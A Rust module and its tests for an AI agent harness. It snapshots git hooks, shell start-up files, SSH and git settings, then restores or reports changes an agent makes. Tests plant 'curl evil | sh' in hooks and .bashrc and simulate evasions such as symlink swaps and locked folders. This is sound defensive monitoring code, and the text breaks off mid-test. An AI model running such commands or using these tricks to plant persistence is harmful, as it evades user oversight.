//! A tripwire for what `git status` cannot see: git's own hooks and
//! settings files, and a few files outside the project that would let an
//! agent's code run later with the user's rights (shell start-up files, the
//! global git settings, SSH keys, the `harness` program itself).
//!
//! The harness takes a [`Snapshot`] before a role and compares it after.
//! This only *notices* a change; preventing it would need a sandbox of the
//! operating system, which not every agent has.

mod files;

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::git::{GitError, Repo};
use crate::task::agent_stubs;
use files::{add_tree, put_back, put_back_folder_modes, read, Content};

/// Files inside the home folder that are watched, with `/`. A file that
/// does not exist is watched too: creating it is a change. Both the Unix
/// shells and Windows PowerShell are listed; on each system the others are
/// simply missing.
pub const HOME_FILES: &[&str] = &[
    // Shell start-up files: run in every new terminal.
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".zshrc",
    ".zshenv",
    ".zprofile",
    ".config/fish/config.fish",
    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
    "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
    // Global git settings: can make git run any command, also in the harness.
    ".gitconfig",
    ".config/git/config",
    // Who may log in over SSH, and what SSH runs.
    ".ssh/authorized_keys",
    ".ssh/config",
    ".ssh/rc",
];

/// The folders of git's own files that `git status` does not show and that
/// agents never need to change: hooks run commands, `info/` holds
/// attributes and excludes. (`config` is checked separately.)
const GIT_FOLDERS: &[&str] = &["hooks", "info"];

/// Files in those folders that git writes by itself: `info/refs` is the list
/// of branches that `git update-server-info` keeps for serving over plain
/// HTTP. Newer git (2.5x) runs a repack in the background after a commit,
/// and the repack rewrites this file, maybe while the next role runs. It
/// holds no command, so a change to it is not a reason to stop.
const GIT_OWN_FILES: &[&str] = &["info/refs"];

/// What the tripwire watches: folders that are put back after a change, and
/// single files that are only reported.
#[derive(Debug, Clone, Default)]
pub struct Watched {
    /// Folders whose files are kept whole and put back (git's hooks, `info/`).
    pub restored_folders: Vec<PathBuf>,
    /// Single files that are only reported (see [`HOME_FILES`]).
    pub reported_files: Vec<PathBuf>,
    /// Files inside the restored folders that are not watched (see [`GIT_OWN_FILES`]).
    pub ignored_files: Vec<PathBuf>,
    /// Git's `info/exclude`: Claude Code's block of stub lines there is put
    /// back without stopping the task (see [`agent_stubs`]).
    pub exclude_file: PathBuf,
}

impl Watched {
    /// The usual list for `repo`: its git folders, the [`HOME_FILES`] in the
    /// home folder, and the running program itself.
    pub fn for_repo(repo: &Repo) -> Result<Self, GitError> {
        let common = repo.git_common_dir()?;
        let restored_folders = GIT_FOLDERS.iter().map(|name| common.join(name)).collect();
        let mut reported_files: Vec<PathBuf> = harness_platform::home::home_dir()
            .map(|home| HOME_FILES.iter().map(|file| home.join(file)).collect())
            .unwrap_or_default();
        if let Ok(program) = std::env::current_exe() {
            reported_files.push(program);
        }
        let ignored_files = GIT_OWN_FILES.iter().map(|name| common.join(name)).collect();
        Ok(Self {
            restored_folders,
            reported_files,
            ignored_files,
            exclude_file: common.join("info").join("exclude"),
        })
    }

    /// Reads everything watched now. A file that cannot be read is noted as
    /// such rather than failing: an agent could plant one on purpose. The
    /// folders are left with the permissions they had.
    pub fn snapshot(&self) -> Snapshot {
        let snapshot = self.read_all();
        // Reading unlocked the folders. Locking them again leaves no trace of
        // the harness, so the role sees the folders as the user left them.
        // A folder that stays unlocked only has more rights for its owner.
        let _ = put_back_folder_modes(&snapshot.files, &[]);
        snapshot
    }

    /// Reads everything watched now, and leaves the restored folders
    /// unlocked (see [`add_tree`]).
    fn read_all(&self) -> Snapshot {
        let mut files = BTreeMap::new();
        for folder in &self.restored_folders {
            add_tree(folder, &mut files);
        }
        for file in &self.ignored_files {
            // Only a plain file is git's own; a link or a folder in its place
            // is not, and is put back like any other change.
            if let Some(Some(Content::File { .. } | Content::Summary { .. })) = files.get(file) {
                files.remove(file);
            }
        }
        for file in &self.reported_files {
            // A file the user keeps private from the harness must not stop every role.
            let content = read(file).unwrap_or_else(|e| Some(Content::Unreadable(e.kind())));
            files.insert(file.clone(), content);
        }
        Snapshot { files }
    }

    /// Is `path` one of the folders that are put back (not something in one)?
    fn is_root(&self, path: &Path) -> bool {
        self.restored_folders.iter().any(|f| path == f)
    }

    /// Is `path` inside one of the folders that are put back?
    fn is_restored(&self, path: &Path) -> bool {
        self.restored_folders.iter().any(|f| path.starts_with(f))
    }

    /// Is this change only Claude Code's stub lines added to `info/exclude`?
    fn is_stub_exclude(
        &self,
        path: &Path,
        before: Option<&Content>,
        after: Option<&Content>,
    ) -> bool {
        if path != self.exclude_file {
            return false;
        }
        let Some(Content::File {
            bytes: after,
            permissions: after_permissions,
        }) = after
        else {
            return false;
        };
        // A missing file counts as empty: Claude Code creates it when it is not there.
        let before = match before {
            None => &[][..],
            // Claude Code only appends lines; it does not change the permissions.
            Some(Content::File { bytes, permissions }) if permissions == after_permissions => {
                bytes.as_slice()
            }
            Some(_) => return false,
        };
        agent_stubs::only_stub_lines(before, after)
    }
}

/// The watched files at one moment.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Snapshot {
    /// Every watched file and what it held; `None` means it did not exist.
    files: BTreeMap<PathBuf, Option<Content>>,
}

/// What changed between two snapshots, split by what the harness did.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Changes {
    /// Changed files in the restored folders; they are now as before.
    pub put_back: Vec<PathBuf>,
    /// Changed single files, left as they are for the user to check.
    pub reported: Vec<PathBuf>,
    /// Changed files in the restored folders that could not be put back
    /// (removed when possible): the user must look at them by hand.
    pub not_put_back: Vec<PathBuf>,
    /// `info/exclude` changed and held Claude Code's block of stub lines
    /// (now put back): its new empty stub files must be removed. When the
    /// block was the only change, it is not a reason to stop.
    pub claude_stubs: bool,
}

impl Changes {
    /// True when nothing watched changed, apart from Claude Code's stub lines.
    pub fn is_empty(&self) -> bool {
        self.put_back.is_empty() && self.reported.is_empty() && self.not_put_back.is_empty()
    }
}

impl Snapshot {
    /// Compares `self` (taken before the role) with the files now, and puts
    /// the restored folders back as they were in `self`. A file that cannot
    /// be put back does not stop the others: an agent must not keep a
    /// planted hook by making one file impossible to restore.
    pub fn check_and_restore(&self, watched: &Watched) -> Changes {
        let now = watched.read_all();
        let mut changes = Changes::default();
        // A file is in one map or both; `chain` + dedup visits each once.
        let mut paths: Vec<&PathBuf> = self.files.keys().chain(now.files.keys()).collect();
        paths.sort();
        paths.dedup();
        // New files are removed first, and only then old ones written back.
        // On macOS and Windows `README` and `readme` are one file: after a
        // rename from one to the other, removing the "new" name afterwards
        // would remove the user's file that was just written back.
        let (new, old): (Vec<&PathBuf>, Vec<&PathBuf>) = paths
            .into_iter()
            .partition(|path| matches!(self.files.get(*path), None | Some(None)));
        // Links put back in this pass: what is below them is somewhere else.
        let mut links_put_back: Vec<&PathBuf> = Vec::new();
        for path in new.into_iter().chain(old) {
            let before = self.files.get(path).cloned().flatten();
            let after = now.files.get(path).cloned().flatten();
            if before == after {
                continue;
            }
            if !watched.is_restored(path) {
                changes.reported.push(path.clone());
                continue;
            }
            // Git makes `hooks/` or `info/` itself when they are missing (and
            // Claude Code makes `info/` for its stub lines): only what is in
            // them counts.
            if before.is_none()
                && matches!(after, Some(Content::Folder(_)))
                && watched.is_root(path)
            {
                continue;
            }
            // Below something that could not be removed (maybe a link to
            // elsewhere), or below a link just made again, any change would
            // land outside the folder. Within each pass the paths are sorted,
            // so a folder comes before what is in it. A new path is handled
            // before the old folder it is in, but that folder is a real
            // folder now: `read_all` never goes into a link.
            if changes.not_put_back.iter().any(|f| path.starts_with(f)) {
                changes.not_put_back.push(path.clone());
                continue;
            }
            if links_put_back.iter().any(|link| path.starts_with(link)) {
                // Removed together with the folder that the link replaced.
                changes.put_back.push(path.clone());
                continue;
            }
            // A folder whose permissions alone changed keeps what is in it;
            // the permissions come back at the end, with all the folders'.
            let only_mode = matches!(
                (&before, &after),
                (Some(Content::Folder(_)), Some(Content::Folder(_)))
            );
            if !only_mode && put_back(path, before.as_ref()).is_err() {
                changes.not_put_back.push(path.clone());
                continue;
            }
            if matches!(before, Some(Content::Link(_))) {
                links_put_back.push(path);
            }
            if *path == watched.exclude_file {
                // Claude Code ran, also when it is not the only change.
                changes.claude_stubs = matches!(&after, Some(Content::File { bytes, .. })
                    if agent_stubs::has_stub_block(bytes));
            }
            if !watched.is_stub_exclude(path, before.as_ref(), after.as_ref()) {
                changes.put_back.push(path.clone());
            }
        }
        // Last, when nothing more is written in the folders.
        let failed = put_back_folder_modes(&self.files, &changes.not_put_back);
        for path in failed {
            changes.put_back.retain(|put| *put != path);
            if !changes.not_put_back.contains(&path) {
                changes.not_put_back.push(path);
            }
        }
        // The two passes above mixed the order; sorted lists read better.
        changes.put_back.sort();
        changes.reported.sort();
        changes.not_put_back.sort();
        changes
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use files::MAX_KEPT_BYTES;
    use std::fs;

    fn watched(dir: &Path) -> Watched {
        Watched {
            restored_folders: vec![dir.join("hooks"), dir.join("info")],
            reported_files: vec![dir.join("home/.bashrc"), dir.join("home/.gitconfig")],
            ignored_files: vec![dir.join("info/refs")],
            exclude_file: dir.join("info/exclude"),
        }
    }

    #[test]
    fn nothing_changed_means_no_changes() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        fs::write(dir.path().join("hooks/pre-commit.sample"), "sample").unwrap();
        let watched = watched(dir.path());

        let before = watched.snapshot();

        assert_eq!(before.check_and_restore(&watched), Changes::default());
    }

    #[test]
    fn claude_codes_stub_lines_in_exclude_are_put_back_quietly() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        let exclude = dir.path().join("info/exclude");
        fs::write(&exclude, "# excludes\n").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // What Claude Code appends when it starts its sandbox.
        fs::write(
            &exclude,
            "# excludes\n\n\n# claude-code scrub-mode stubs\n/package.json\n/.env",
        )
        .unwrap();

        let changes = before.check_and_restore(&watched);

        assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
        assert_eq!(fs::read_to_string(&exclude).unwrap(), "# excludes\n");
    }

    #[test]
    fn other_exclude_lines_still_stop_the_task() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        let exclude = dir.path().join("info/exclude");
        fs::write(&exclude, "# excludes\n").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::write(
            &exclude,
            "# excludes\n\n# claude-code scrub-mode stubs\n/package.json\n/src\n",
        )
        .unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&exclude));
        assert_eq!(fs::read_to_string(&exclude).unwrap(), "# excludes\n");
    }

    #[test]
    fn a_stub_block_anywhere_else_still_stops_the_task() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let block = "\n\n# claude-code scrub-mode stubs\n/package.json";
        fs::write(dir.path().join("hooks/pre-commit"), block).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, [dir.path().join("hooks/pre-commit")]);
        assert!(!changes.claude_stubs);
    }

    #[test]
    fn a_stub_block_in_a_new_exclude_file_is_claude_codes() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // Claude Code creates `exclude` when git did not.
        let exclude = dir.path().join("info/exclude");
        fs::write(&exclude, "\n\n# claude-code scrub-mode stubs\n/.env").unwrap();

        let changes = before.check_and_restore(&watched);

        assert!(changes.is_empty() && changes.claude_stubs, "{changes:?}");
        assert!(!exclude.exists());
    }

    #[test]
    fn a_missing_home_file_that_appears_empty_is_still_reported() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("home")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // What Claude Code does with a missing start-up file.
        fs::write(dir.path().join("home/.bashrc"), "").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.reported, [dir.path().join("home/.bashrc")]);
    }

    #[test]
    fn info_refs_that_git_rewrites_by_itself_is_not_a_change() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("info")).unwrap();
        fs::write(dir.path().join("info/exclude"), "# excludes").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();

        // What a background `git repack` does after a commit.
        fs::write(dir.path().join("info/refs"), "abc123\trefs/heads/main\n").unwrap();

        assert_eq!(before.check_and_restore(&watched), Changes::default());
        assert!(dir.path().join("info/refs").exists(), "it is left alone");
    }

    #[test]
    fn hooks_are_put_back_and_home_files_reported() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(hooks.join("sub")).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "sample").unwrap();
        fs::write(hooks.join("sub/old"), "old").unwrap();
        fs::create_dir_all(dir.path().join("home")).unwrap();
        fs::write(dir.path().join("home/.bashrc"), "alias ll='ls -l'\n").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();

        // What an agent with a shell could do.
        fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();
        fs::write(hooks.join("pre-commit.sample"), "changed").unwrap();
        fs::remove_file(hooks.join("sub/old")).unwrap();
        fs::write(dir.path().join("home/.bashrc"), "curl evil | sh\n").unwrap();
        fs::write(dir.path().join("home/.gitconfig"), "[core]\n").unwrap();
        let changes = before.check_and_restore(&watched);

        assert_eq!(
            changes.put_back,
            [
                hooks.join("pre-commit"),
                hooks.join("pre-commit.sample"),
                hooks.join("sub/old")
            ]
        );
        assert!(!hooks.join("pre-commit").exists());
        assert_eq!(
            fs::read_to_string(hooks.join("pre-commit.sample")).unwrap(),
            "sample"
        );
        assert_eq!(fs::read_to_string(hooks.join("sub/old")).unwrap(), "old");
        assert_eq!(
            changes.reported,
            [
                dir.path().join("home/.bashrc"),
                dir.path().join("home/.gitconfig")
            ]
        );
        // Reported files are left for the user.
        assert!(dir.path().join("home/.gitconfig").exists());
        // Everything is back in the folders, so a second check is quiet
        // there; the home files still differ from the first snapshot.
        let again = before.check_and_restore(&watched);
        assert_eq!(again.put_back, Vec::<PathBuf>::new());
    }

    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
    #[cfg(unix)]
    #[test]
    fn a_link_in_place_of_the_hooks_folder_is_removed_and_its_target_kept() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "sample").unwrap();
        let elsewhere = dir.path().join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        fs::write(elsewhere.join("pre-commit"), "curl evil | sh").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();

        fs::remove_dir_all(&hooks).unwrap();
        std::os::unix::fs::symlink(&elsewhere, &hooks).unwrap();
        let changes = before.check_and_restore(&watched);

        assert_eq!(
            changes.put_back,
            [hooks.clone(), hooks.join("pre-commit.sample")]
        );
        assert!(!fs::symlink_metadata(&hooks).unwrap().is_symlink());
        assert_eq!(
            fs::read_to_string(hooks.join("pre-commit.sample")).unwrap(),
            "sample"
        );
        assert!(elsewhere.join("pre-commit").exists());
    }

    #[test]
    fn a_big_file_is_compared_by_its_size_and_time() {
        let dir = tempfile::tempdir().unwrap();
        let program = dir.path().join("harness");
        let size = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
        fs::write(&program, vec![b'a'; size]).unwrap();
        let watched = Watched {
            restored_folders: Vec::new(),
            reported_files: vec![program.clone()],
            ignored_files: Vec::new(),
            exclude_file: dir.path().join("exclude"),
        };
        let before = watched.snapshot();

        fs::write(&program, vec![b'b'; size + 1]).unwrap();

        assert_eq!(before.check_and_restore(&watched).reported, [program]);
    }

    #[test]
    fn the_usual_list_watches_the_git_folders_and_the_home_files() {
        let dir = tempfile::tempdir().unwrap();
        let repo = Repo::init(dir.path()).unwrap();

        let watched = Watched::for_repo(&repo).unwrap();

        let git = dir.path().join(".git").canonicalize().unwrap();
        let folders: Vec<PathBuf> = watched
            .restored_folders
            .iter()
            .map(|f| {
                f.parent()
                    .unwrap()
                    .canonicalize()
                    .unwrap()
                    .join(f.file_name().unwrap())
            })
            .collect();
        assert_eq!(folders, [git.join("hooks"), git.join("info")]);
        assert!(watched
            .reported_files
            .iter()
            .any(|f| f.ends_with(".bashrc")));
        assert!(watched
            .reported_files
            .iter()
            .any(|f| f.ends_with(".gitconfig")));
    }

    #[test]
    fn a_file_at_the_size_limit_is_still_put_back_whole() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let hook = dir.path().join("hooks/pre-commit");
        let limit = usize::try_from(MAX_KEPT_BYTES).unwrap();
        fs::write(&hook, vec![b'a'; limit]).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::write(&hook, vec![b'b'; limit]).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
        assert_eq!(fs::read(&hook).unwrap(), vec![b'a'; limit]);
    }

    #[test]
    fn a_big_home_file_is_reported_by_its_size() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("home")).unwrap();
        let bashrc = dir.path().join("home/.bashrc");
        let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
        fs::write(&bashrc, vec![b'a'; over_limit]).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::write(&bashrc, vec![b'a'; over_limit + 1]).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.reported, [bashrc]);
    }

    #[test]
    fn a_hook_replaced_by_a_folder_is_put_back_and_later_hooks_too() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let hook = dir.path().join("hooks/commit-msg");
        fs::write(&hook, "original").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::remove_file(&hook).unwrap();
        fs::create_dir_all(&hook).unwrap();
        fs::write(hook.join("run.sh"), "echo planted").unwrap();
        // Sorted after the folder: it must still be removed.
        let planted = dir.path().join("hooks/post-checkout");
        fs::write(&planted, "echo planted").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(
            changes.put_back,
            [hook.clone(), hook.join("run.sh"), planted.clone()]
        );
        assert_eq!(fs::read_to_string(&hook).unwrap(), "original");
        assert!(!planted.exists());
    }

    // The permissions below are Unix modes; a Windows file has only a
    // read-only flag, which is kept the same way.
    #[cfg(unix)]
    #[test]
    fn a_hook_is_put_back_still_executable() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let hook = dir.path().join("hooks/pre-commit");
        fs::write(&hook, "cargo fmt --check").unwrap();
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::remove_file(&hook).unwrap();
        fs::write(&hook, "curl evil | sh").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
        assert_eq!(fs::read_to_string(&hook).unwrap(), "cargo fmt --check");
        let mode = fs::metadata(&hook).unwrap().permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o755,
            "git skips a hook that is not executable"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_hook_made_executable_is_a_change() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let hook = dir.path().join("hooks/pre-commit");
        fs::write(&hook, "echo off").unwrap();
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o644)).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
        let mode = fs::metadata(&hook).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o644);
    }

    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
    #[cfg(unix)]
    #[test]
    fn a_linked_hook_is_put_back_as_a_link() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        fs::write(dir.path().join("check.sh"), "cargo test").unwrap();
        let hook = dir.path().join("hooks/pre-push");
        std::os::unix::fs::symlink("../check.sh", &hook).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::remove_file(&hook).unwrap();
        fs::write(&hook, "curl evil | sh").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&hook));
        assert_eq!(fs::read_link(&hook).unwrap(), Path::new("../check.sh"));
        assert_eq!(fs::read_to_string(&hook).unwrap(), "cargo test");
    }

    #[test]
    fn one_file_that_cannot_be_put_back_does_not_stop_the_others() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        // No copy is kept of a big file, so a change of it cannot be put
        // back. (This fails even for root, unlike a file without permissions.)
        let big = dir.path().join("hooks/a-big-hook");
        let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
        fs::write(&big, vec![b'a'; over_limit]).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::write(&big, vec![b'b'; over_limit + 1]).unwrap();
        // Sorted after the failing file: it must still be removed.
        let planted = dir.path().join("hooks/pre-commit");
        fs::write(&planted, "planted").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.not_put_back, [big]);
        assert_eq!(changes.put_back, std::slice::from_ref(&planted));
        assert!(!planted.exists());
    }

    #[cfg(unix)]
    #[test]
    fn a_planted_pipe_is_removed_without_reading_it() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let pipe = dir.path().join("hooks/pre-commit");
        let made = std::process::Command::new("mkfifo")
            .arg(&pipe)
            .status()
            .unwrap();
        assert!(made.success());

        // Reading the pipe would wait forever, so the check runs in a
        // thread and the test fails after a while instead of hanging.
        let (sender, receiver) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let changes = before.check_and_restore(&watched);
            sender.send(changes.put_back).unwrap();
        });
        let put_back = receiver
            .recv_timeout(std::time::Duration::from_secs(10))
            .expect("the check hung on the pipe");

        assert_eq!(put_back, std::slice::from_ref(&pipe));
        fs::symlink_metadata(&pipe).unwrap_err();
    }

    #[cfg(unix)]
    #[test]
    fn a_planted_socket_is_removed_without_reading_it() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let socket = dir.path().join("hooks/post-checkout");
        let _listener = std::os::unix::net::UnixListener::bind(&socket).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, std::slice::from_ref(&socket));
        fs::symlink_metadata(&socket).unwrap_err();
    }

    // As root (in a container) every file can be read, so there this passes
    // also without the fix; as a user (CI) the unreadable file used to fail
    // the whole check before anything was put back.
    #[cfg(unix)]
    #[test]
    fn an_unreadable_planted_hook_does_not_stop_the_check() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let locked = dir.path().join("hooks/0");
        fs::write(&locked, "secret").unwrap();
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        let planted = dir.path().join("hooks/pre-commit");
        fs::write(&planted, "curl evil | sh").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, [locked.clone(), planted.clone()]);
        assert!(!locked.exists());
        assert!(!planted.exists());
    }

    // As root (in a container) the rights are not checked, so there these two
    // pass also without unlocking; as a user (CI) they do not.
    #[cfg(unix)]
    #[test]
    fn a_hook_in_a_locked_hooks_folder_is_still_removed() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        let watched = watched(dir.path());
        let mode = |path: &Path| fs::metadata(path).unwrap().permissions().mode() & 0o777;
        let original = mode(&hooks);
        let before = watched.snapshot();
        let planted = hooks.join("pre-commit");
        fs::write(&planted, "curl evil | sh").unwrap();
        // Git can still run what is inside, but nothing can be removed.
        fs::set_permissions(&hooks, fs::Permissions::from_mode(0o500)).unwrap();

        let changes = before.check_and_restore(&watched);

        // The folder's permissions are a change too, and come back.
        assert_eq!(changes.put_back, [hooks.clone(), planted.clone()]);
        assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
        assert!(!planted.exists());
        assert_eq!(mode(&hooks), original);
    }

    #[cfg(unix)]
    #[test]
    fn a_hook_in_a_folder_that_cannot_be_entered_is_still_removed() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        let folder = dir.path().join("hooks/d");
        fs::create_dir_all(&folder).unwrap();
        fs::write(folder.join("f"), "planted").unwrap();
        // Can be listed, but not entered (`chmod 600`).
        fs::set_permissions(&folder, fs::Permissions::from_mode(0o600)).unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, [folder.clone(), folder.join("f")]);
        assert_eq!(changes.not_put_back, Vec::<PathBuf>::new());
        assert!(!folder.exists());
    }

    #[test]
    fn a_changed_big_hook_is_not_called_put_back() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let hook = dir.path().join("hooks/pre-push");
        let over_limit = usize::try_from(MAX_KEPT_BYTES).unwrap() + 1;
        fs::write(&hook, vec![b'a'; over_limit]).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        fs::write(&hook, vec![b'b'; over_limit + 1]).unwrap();

        let changes = before.check_and_restore(&watched);

        // No copy was kept: the agent's version is removed, and the user is
        // told the file is not as before.
        assert_eq!(changes.not_put_back, std::slice::from_ref(&hook));
        assert_eq!(changes.put_back, Vec::<PathBuf>::new());
        assert!(!hook.exists());
    }

    #[cfg(unix)]
    #[test]
    fn nothing_is_written_through_a_link_that_could_not_be_removed() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let git = dir.path().join("git");
        let hooks = git.join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit"), "mine").unwrap();
        let watched = Watched {
            restored_folders: vec![hooks.clone()],
            reported_files: Vec::new(),
            ignored_files: Vec::new(),
            exclude_file: git.join("info/exclude"),
        };
        let before = watched.snapshot();
        let elsewhere = dir.path().join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        fs::remove_dir_all(&hooks).unwrap();
        std::os::unix::fs::symlink(&elsewhere, &hooks).unwrap();
        // The folder holding the link is locked, so the link cannot be
        // removed. (Root may remove it anyway: then the hooks come back.)
        fs::set_permissions(&git, fs::Permissions::from_mode(0o500)).unwrap();

        let changes = before.check_and_restore(&watched);

        fs::set_permissions(&git, fs::Permissions::from_mode(0o700)).unwrap();
        assert!(
            !elsewhere.join("pre-commit").exists(),
            "written through the link"
        );
        if changes.not_put_back.is_empty() {
            assert_eq!(
                fs::read_to_string(hooks.join("pre-commit")).unwrap(),
                "mine"
            );
        } else {
            assert_eq!(
                changes.not_put_back,
                [hooks.clone(), hooks.join("pre-commit")]
            );
        }
    }

    // Making a link needs extra rights on Windows, so this runs on Linux and macOS.
    #[cfg(unix)]
    #[test]
    fn nothing_is_removed_through_a_linked_folder_put_back() {
        let dir = tempfile::tempdir().unwrap();
        let shared = dir.path().join("shared");
        fs::create_dir_all(&shared).unwrap();
        fs::write(shared.join("pre-commit"), "the user's own").unwrap();
        let hooks = dir.path().join("hooks");
        std::os::unix::fs::symlink(&shared, &hooks).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // The agent puts a real folder in place of the link.
        fs::remove_file(&hooks).unwrap();
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();

        let changes = before.check_and_restore(&watched);

        assert_eq!(changes.put_back, [hooks.clone(), hooks.join("pre-commit")]);
        assert_eq!(fs::read_link(&hooks).unwrap(), shared);
        assert_eq!(
            fs::read_to_string(shared.join("pre-commit")).unwrap(),
            "the user's own"
        );
    }

    #[test]
    fn a_renamed_hook_is_put_back_under_its_old_name() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir_all(&hooks).unwrap();
        fs::write(hooks.join("README"), "mine").unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // On macOS and Windows these two names are one file.
        fs::rename(hooks.join("README"), hooks.join("readme")).unwrap();

        before.check_and_restore(&watched);

        let names: Vec<_> = fs::read_dir(&hooks)
            .unwrap()
            .map(|entry| entry.unwrap().file_name())
            .collect();
        assert_eq!(names, ["README"]);
        assert_eq!(fs::read_to_string(hooks.join("README")).unwrap(), "mine");
    }

    #[test]
    fn an_empty_planted_folder_is_removed() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("hooks")).unwrap();
        let watched = watched(dir.path());
        let before = watched.snapshot();
        // Git would fail on a folder named like a hook.
